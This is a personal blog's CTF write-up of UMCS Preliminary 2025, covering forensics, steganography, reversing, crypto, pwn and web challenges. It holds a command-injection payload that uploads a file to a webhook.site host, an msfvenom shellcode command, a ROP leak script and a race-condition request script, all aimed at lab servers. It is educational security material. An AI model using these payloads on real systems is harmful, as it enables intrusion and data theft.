@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>UMCS Preliminary 2025 | 4ry</title>
+    <link rel="stylesheet" href="../styles.css">
+  </head>
+  <body>
+    <aside class="sidebar">
+      <a class="brand" href="../index.html" aria-label="Home"><img class="avatar" src="../assets/avatar.jpg" alt=""><span class="site-title">4ry</span></a>
+      <nav class="nav" aria-label="Primary navigation"><a class="nav-link" href="../index.html"><span>⌂</span>Home</a><a class="nav-link" href="../categories/index.html"><span>☰</span>Categories</a><a class="nav-link" href="/music/"><span>♪</span>Music</a><a class="nav-link" href="../about/index.html"><span>ⓘ</span>About</a></nav>
+      <div class="socials" aria-label="Social links"><button class="theme-toggle" type="button" aria-label="Toggle light mode">◐</button><a href="https://github.com/akmlalff" aria-label="GitHub"><img class="social-icon" src="../assets/icons/github.svg" alt=""></a><a href="https://www.linkedin.com/in/akmalaliff" aria-label="LinkedIn"><img class="social-icon" src="../assets/icons/linkedin.svg" alt=""></a><a href="mailto:akmalaliff@gmail.com" aria-label="Email"><img class="social-icon" src="../assets/icons/email.svg" alt=""></a><a href="https://open.spotify.com/user/22ixrbtx4wsrufvosaf2gf3ty?si=6948217fbb694f00" aria-label="Spotify"><img class="social-icon" src="../assets/icons/spotify.svg" alt=""></a></div>
+    </aside>
+    <main class="shell">
+      <header class="topbar"><div><a class="crumb" href="../index.html">Home</a><span class="muted"> › CTF › UMCS Preliminary 2025</span></div><label class="search"><span>⌕</span><input id="searchInput" type="search" placeholder="Search..."></label></header>
+      <div class="layout">
+        <article class="content article">
+          <header class="article-header"><h1>UMCS Preliminary 2025</h1><div class="article-meta"><span>May 20, 2025</span><span>CTF</span><span>UMCS Preliminary 2025 / Writeup</span></div></header>
+          <div class="article-body">
+            <h2>Table of Contents</h2>
+            <ol class="toc-list">
+              <li><a href="#forensic">Forensic - Hidden in Plain Graphic</a></li>
+              <li><a href="#steganography">Steganography - Broken, Hotline Miami</a></li>
+              <li><a href="#reverse">Reverse Engineering - Http-Server</a></li>
+              <li><a href="#crypto">Cryptography - Gist of Samuel</a></li>
+              <li><a href="#pwn">PWN - babysc, Liveleak</a></li>
+              <li><a href="#web">Web - Healthcheck, Straghtforward</a></li>
+            </ol>
+
+            <h2 id="forensic">Forensic</h2>
+            <h3>1. Hidden in Plain Graphic (Nyamuk)</h3>
+            <h4>Description</h4>
+            <blockquote>Agent Ali, who are secretly a spy from Malaysia has been communicate with others spy from all around the world using secret technique. Intelligence agencies have been monitoring his activities, but so far, no clear evidence of his communications has surfaced. Can you find any suspicious traffic in this file?</blockquote>
+            <p><strong>Files Given:</strong> <code>plain_zight.pcap</code></p>
+            <p>First, I opened the packet capture to see what protocols were inside. Next, I filtered HTTP traffic because maybe there were files I could export, but I found nothing.</p>
+            <p>Then, I tried looking for hidden content inside the pcap using <code>binwalk</code>. From the scan, I saw that there was a PNG file detected at offset <code>0x10DF1</code>, which is <code>69105</code> in decimal. So, I knew there was a hidden image embedded inside the packet.</p>
+            <pre><code>binwalk -e plain_zight.pcap
+dd if=plain_zight.pcap of=manual_extracted.png bs=1 skip=69105
+file manual_extracted.png
+zsteg manual_extracted.png</code></pre>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_003/page_003_image_01_xref_72.png" alt="Hidden in Plain Graphic traffic analysis"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_004/page_004_image_01_xref_74.png" alt="Binwalk output for hidden PNG"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_005/page_005_image_01_xref_77.png" alt="Extracted PNG evidence"></figure>
+            <p><strong>Flag:</strong> <code>umcs{h1dd3n_1n_png_st3g}</code></p>
+
+            <h2 id="steganography">Steganography</h2>
+            <h3>1. Broken (Akmlalff)</h3>
+            <h4>Description</h4>
+            <blockquote>Can you fix what’s broken?</blockquote>
+            <p><strong>Files Given:</strong> <code>Broken.mp4</code></p>
+            <p>We could not see the video because it was broken. After using <code>exiftool</code> and checking the hex, everything looked okay, so I thought the MP4 was really broken. I searched for an online MP4 repair tool, uploaded the file, and got the flag from the repaired video.</p>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_007/page_007_image_01_xref_84.png" alt="Broken MP4 challenge evidence"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_008/page_008_image_01_xref_88.png" alt="Recovered Broken MP4 flag"></figure>
+            <p><strong>Flag:</strong> <code>umcs{h1dd3n_1n_fr4me}</code></p>
+
+            <h3>2. Hotline Miami (Akmlalff)</h3>
+            <h4>Description</h4>
+            <blockquote>You’ve intercepted a mysterious floppy disk labeled 50 BLESSINGS, left behind by a shadowy figure in a rooster mask. The disk contains a cryptic image and a garbled audio file. Rumor has it the message reveals the location of a hidden safehouse tied to the 1989 Miami incident. Decrypt the clues before the Russians trace your signal.</blockquote>
+            <p><strong>Files Given:</strong> <code>iamthekidyouknowwhatimean.wav</code>, <code>readme.txt</code>, <code>rooster.jpg</code></p>
+            <p>The readme hinted at the flag format. For the audio, I inserted it into Sonic Visualiser and used a spectrogram layer. This revealed the last two parts of the flag: <code>WATCHING</code> and <code>1989</code>.</p>
+            <p>For <code>rooster.jpg</code>, I dropped it into AperiSolve and found <code>Richard</code> near the end of the strings. Richard is a character in Hotline Miami, and after researching the lore, the clues fit the format <code>Subject_Be_Verb_Year</code>.</p>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_009/page_009_image_01_xref_90.png" alt="Hotline Miami readme hint"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_010/page_010_image_03_xref_95.png" alt="Spectrogram evidence for Hotline Miami"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_012/page_012_image_01_xref_100.png" alt="AperiSolve strings evidence"></figure>
+            <p><strong>Flag:</strong> <code>umcs{Richard_Is_Watching_1989}</code></p>
+
+            <h2 id="reverse">Reverse Engineering</h2>
+            <h3>1. Http-Server (Akmlalff)</h3>
+            <h4>Description</h4>
+            <blockquote>I created a http server during my free time.</blockquote>
+            <p><strong>Connection:</strong> <code>34.133.69.112:8080</code></p>
+            <p><strong>Files Given:</strong> <code>server.unknown</code></p>
+            <p>We got a file named <code>server.unknown</code>. After checking the file type, it was an ELF file. I decompiled it with Ghidra and saw that the server checks for a very specific request string using <code>strstr</code>:</p>
+            <pre><code>GET /goodshit/umcs_server HTTP/13.37
+printf "GET /goodshit/umcs_server HTTP/13.37\r\n\r\n" | nc 34.133.69.112 8080</code></pre>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_013/page_013_image_01_xref_104.png" alt="Http-Server binary analysis"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_015/page_015_image_02_xref_109.png" alt="Http-Server exploit request"></figure>
+            <p><strong>Flag:</strong> <code>umcs{http_server_a058712ff1da79c9c9bbf211907c65a5cd}</code></p>
+
+            <h2 id="crypto">Cryptography</h2>
+            <h3>1. Gist of Samuel (Ikhwn.nzm &amp; Akmlalff)</h3>
+            <h4>Description</h4>
+            <blockquote>Samuel is gatekeeping his favourite campsite. We found his note.</blockquote>
+            <p><strong>Files Given:</strong> <code>Gist of Samuel.txt</code></p>
+            <p><strong>Hint:</strong> <a href="https://gist.github.com/umcybersec">https://gist.github.com/umcybersec</a></p>
+            <p>We were given a file full of train emojis. From the pattern, the blue train was always singular, so we assumed it was Morse code because spaces were needed to separate the characters.</p>
+            <p>After converting it to dots and dashes, we used online Morse decoders. The result looked like a hash, but after the admin hint, we realized it was actually a GitHub Gist identifier.</p>
+            <pre><code>https://gist.github.com/umcybersec/e012d0a1fffac42d6aae00c54078ad3e</code></pre>
+            <p>The Gist contained ASCII art. Since Samuel is obsessed with trains, we tried Rail Fence cipher. Using key <code>8</code>, then adjusting the text width, revealed the flag.</p>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_016/page_016_image_01_xref_111.png" alt="Gist of Samuel train emoji cipher"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_017/page_017_image_01_xref_113.png" alt="Morse decoding evidence"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_020/page_020_image_02_xref_130.png" alt="Rail fence ASCII art decoding"></figure>
+            <p><strong>Flag:</strong> <code>umsc{WILLOW_TREE_CAMPSITE}</code></p>
+
+            <h2 id="pwn">PWN</h2>
+            <h3>1. babysc (Ikwn.nzm)</h3>
+            <h4>Description</h4>
+            <blockquote>Shellcode</blockquote>
+            <p><strong>Connection:</strong> <code>34.133.69.112:10001</code></p>
+            <p><strong>Files Given:</strong> <code>Dockerfile</code>, <code>babysc.c</code>, <code>babysc</code></p>
+            <p>First, I analyzed the binary using <code>checksec</code>. RWX segments were enabled, so I could inject and run shellcode directly. Then I used simple XOR encoding to bypass the blacklist and get the flag.</p>
+            <pre><code>msfvenom -p linux/x64/exec CMD="cat /flag" -f raw -b '\x0f\x05\xcd\x80' -e x86/call4_dword_xor -o payload_xor.bin</code></pre>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_022/page_022_image_01_xref_135.png" alt="babysc checksec"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_023/page_023_image_02_xref_139.png" alt="babysc exploit output"></figure>
+            <p><strong>Flag:</strong> <code>umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a}</code></p>
+
+            <h3>2. Liveleak (Ikhwn.nzm)</h3>
+            <h4>Description</h4>
+            <blockquote>No desc</blockquote>
+            <p><strong>Connection:</strong> <code>34.133.69.112:10007</code></p>
+            <p><strong>Files Given:</strong> <code>chall</code>, <code>Dockerfile</code>, <code>ld-2.35.so</code>, <code>libc.so.6</code></p>
+            <p><code>checksec</code> showed no canary, NX enabled, and no PIE. That means stack overflow was possible, but ROP was needed. After using a cyclic pattern in GDB, the offset was <code>72</code> bytes.</p>
+            <pre><code>from pwn import *
+
+context.binary = elf = ELF('./chall')
+libc = ELF('./libc.so.6')
+p = remote('34.133.69.112', 10007)
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+
+payload = flat(
+    b'A' * 72,
+    pop_rdi,
+    elf.got['puts'],
+    elf.plt['puts'],
+    elf.symbols['main']
+)
+p.sendlineafter("Enter your input:", payload)</code></pre>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_024/page_024_image_02_xref_144.png" alt="Liveleak checksec and offset"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_028/page_028_image_02_xref_160.png" alt="Liveleak exploit script"></figure>
+            <p><strong>Flag:</strong> <code>umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}</code></p>
+
+            <h2 id="web">Web</h2>
+            <h3>1. Healthcheck (Ikhwn.nzm)</h3>
+            <h4>Description</h4>
+            <blockquote>I left my hopes_and_dreams on the server. can you help fetch it for me?</blockquote>
+            <p><strong>Connection:</strong> <code>http://104.214.185.119/index.php</code></p>
+            <p>The PHP source accepted a URL, sanitized blacklist characters, and executed a <code>curl</code> command to check the HTTP response. Since direct command execution was limited, the working approach was to use <code>curl</code> with a webhook and upload the target file using <code>-F</code>.</p>
+            <pre><code>http://127.0.0.1/x$(curl -F file=@hopes_and_dreams https://webhook.site/5af80e59-cbce-4dca-bca4-747e8397f71b)</code></pre>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_030/page_030_image_01_xref_170.png" alt="Healthcheck web page"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_033/page_033_image_01_xref_178.png" alt="Healthcheck webhook payload"></figure>
+            <p><strong>Flag:</strong> <code>umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}</code></p>
+
+            <h3>2. Straghtforward (Nyamuk)</h3>
+            <h4>Description</h4>
+            <blockquote>Test out our game center. You'll have free claiming bonus for first timers!</blockquote>
+            <p><strong>Connection:</strong> <code>http://159.69.219.192:7859/</code></p>
+            <p>The portal allowed users to register, log in, claim a daily bonus, and buy a flag when the balance reached $3000. Reviewing the Flask source showed a race condition in the <code>/claim</code> route: the app checks whether the bonus was claimed, then updates the database separately.</p>
+            <p>By grabbing the session cookie before claiming and sending many parallel POST requests to <code>/claim</code>, the balance could increase multiple times before the claim state locked.</p>
+            <pre><code>import threading
+import requests
+
+url = "http://159.69.219.192:7859/claim"
+session_cookie = "..."
+threads_count = 20
+
+def claim_bonus():
+    cookies = {'session': session_cookie}
+    response = requests.post(url, cookies=cookies, timeout=3)
+    print(f"[+] Status: {response.status_code} | Length: {len(response.text)}")</code></pre>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_034/page_034_image_01_xref_182.png" alt="Straghtforward game portal"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_036/page_036_image_01_xref_194.png" alt="Straghtforward race condition source"></figure>
+            <figure><img src="../assets/writeups/umcs-preliminary/images/page_040/page_040_image_02_xref_209.png" alt="Straghtforward exploit result"></figure>
+            <p><strong>Flag:</strong> <code>UMCS{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}</code></p>
+          </div>
+        </article>
+        <aside class="right-rail"><section><h2>Recently Updated</h2><div id="recentPosts" class="rail-list"></div></section></aside>
+      </div>
+    </main>
+    <script src="../posts-data.js?v=clean-descriptions"></script>
+    <script src="../script.js"></script>
+  </body>
+</html>
